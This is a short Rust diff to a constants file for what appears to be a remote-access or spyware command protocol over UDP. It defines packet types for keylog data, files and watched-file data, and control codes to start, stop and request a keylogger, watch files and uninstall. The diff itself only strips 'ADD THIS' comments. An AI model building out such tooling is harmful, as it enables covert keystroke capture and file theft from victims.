@@ -12,16 +12,16 @@ pub const PACKET_TYPE_CMD_RESP: u8 = 5;
 pub const PACKET_TYPE_FILE: u8 = 6;
 pub const PACKET_TYPE_KEYLOG: u8 = 7;
 pub const PACKET_TYPE_CTRL: u8 = 8;
-pub const PACKET_TYPE_WATCH_DATA: u8 = 9;       // ADD THIS
-pub const PACKET_TYPE_WATCH_DELETED: u8 = 10;   // ADD THIS
+pub const PACKET_TYPE_WATCH_DATA: u8 = 9;
+pub const PACKET_TYPE_WATCH_DELETED: u8 = 10;
 
 // Control subtypes for PACKET_TYPE_CTRL
 pub const CTRL_START_KEYLOGGER: u8 = 1;
 pub const CTRL_STOP_KEYLOGGER: u8 = 2;
 pub const CTRL_REQUEST_KEYLOG: u8 = 3;
 pub const CTRL_UNINSTALL: u8 = 4;
-pub const CTRL_WATCH_FILE: u8 = 5;              // ADD THIS
-pub const CTRL_STOP_WATCH: u8 = 6;              // ADD THIS
+pub const CTRL_WATCH_FILE: u8 = 5;
+pub const CTRL_STOP_WATCH: u8 = 6;
 
 // Fixed 32-byte header in UDP payload
 pub const HEADER_SIZE: usize = 32;
